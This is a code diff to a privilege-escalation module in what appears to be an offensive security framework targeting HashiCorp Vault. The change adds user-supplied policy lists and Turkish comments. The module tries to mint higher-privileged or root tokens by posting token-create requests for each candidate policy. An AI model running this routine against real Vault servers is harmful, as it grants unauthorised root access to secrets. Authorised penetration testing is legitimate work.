@@ -27,7 +27,7 @@ class PrivilegeEscalationModule(BaseExecutionModule):
             risk_level=RiskLevel.STATE_CHANGING,
             description=(
                 "Attempts to abuse token creation capabilities to generate "
-                "higher-privileged or root tokens."
+                "higher-privileged or root tokens. Supports custom policy lists."
             ),
             default_enabled=True,
         )
@@ -45,7 +45,17 @@ class PrivilegeEscalationModule(BaseExecutionModule):
             )
 
         params = params or {}
-        target_policies = _candidate_policies(params.get("policies"))
+        
+        # 1. Önce kullanıcının verdiği politikaları dene
+        user_policies = params.get("policies")
+        if user_policies:
+            if isinstance(user_policies, str):
+                user_policies = [user_policies]
+            target_policies = _dedupe([str(p) for p in user_policies if p])
+        else:
+            # 2. Kullanıcı politikası yoksa kritik listeyi kullan
+            target_policies = list(CRITICAL_POLICIES)
+        
         requested_ttl = params.get("ttl", "30m")
         timeout = params.get("timeout", TIMEOUT)
         verify_tls = params.get("verify_tls", getattr(context, "verify_tls", True))
@@ -62,6 +72,8 @@ class PrivilegeEscalationModule(BaseExecutionModule):
         try:
             source_policies = _lookup_source_policies(context.vault_addr, headers, timeout, verify_tls)
             attempts = []
+            
+            # Kullanıcı politikalarını dene
             for policy_name in target_policies:
                 if policy_name in source_policies:
                     print(f"[*] [ACTIVE] Skipping policy already present on source token: {policy_name}")
@@ -76,7 +88,7 @@ class PrivilegeEscalationModule(BaseExecutionModule):
                     "policies": [policy_name],
                     "ttl": requested_ttl,
                 }
-                print(f"[*] [ACTIVE] Autonomous policy attempt: {policy_name}")
+                print(f"[*] [ACTIVE] Attempting policy: {policy_name}")
                 response = requests.post(
                     url,
                     headers=headers,
